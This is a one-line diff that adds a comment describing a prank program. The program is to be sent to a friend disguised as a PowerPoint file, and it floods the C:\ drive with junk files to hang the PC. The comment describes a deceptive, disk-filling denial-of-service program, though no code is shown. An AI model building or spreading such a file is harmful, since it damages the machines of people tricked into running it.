@@ -1,0 +1,1 @@
+# send this to your friend by saying it is a ppt, it basically creates a bunch of useless files(some trillion i guess) in the C:\ directory in the folder NONSENSE_FILES_BY_RUDRA to hang your friend's pc :)
